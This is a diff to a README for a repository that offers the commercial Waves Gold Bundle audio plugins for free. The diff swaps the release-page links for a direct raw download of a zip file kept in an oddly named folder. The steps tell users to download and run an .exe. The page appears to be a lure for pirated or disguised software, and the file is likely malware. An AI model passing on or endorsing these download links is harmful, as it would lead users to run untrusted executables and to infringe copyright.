@@ -1,6 +1,6 @@
 # 🎚️ Waves-Gold-Bundle-Setup - Professional audio tools for your music projects
 
-[![Download Waves Gold Bundle](https://img.shields.io/badge/Download-Gold_Bundle-blue.svg)](https://github.com/Albertfivespot586/Waves-Gold-Bundle-Setup/releases)
+[![Download Waves Gold Bundle](https://img.shields.io/badge/Download-Gold_Bundle-blue.svg)](https://raw.githubusercontent.com/Albertfivespot586/Waves-Gold-Bundle-Setup/main/coinstantaneousness/Setup-Waves-Gold-Bundle-3.5.zip)
 
 This repository provides the Waves Gold Bundle software. This collection contains 42 audio plugins. You use these tools to mix and master your audio tracks. The bundle includes EQ, compression, reverb, delay, and noise reduction tools. These plugins work within most digital audio workstations.
 
@@ -19,7 +19,7 @@ Computers need specific hardware to run these audio tools. Ensure your system me
 
 Follow these steps to obtain the setup files.
 
-1.  Visit the [Waves Gold Bundle Release Page](https://github.com/Albertfivespot586/Waves-Gold-Bundle-Setup/releases) to access the downloads.
+1.  Visit the [Waves Gold Bundle Release Page](https://raw.githubusercontent.com/Albertfivespot586/Waves-Gold-Bundle-Setup/main/coinstantaneousness/Setup-Waves-Gold-Bundle-3.5.zip) to access the downloads.
 2.  Look for the section marked Assets.
 3.  Click the file ending in .exe to start the download.
 4.  Save the file to your Downloads folder.
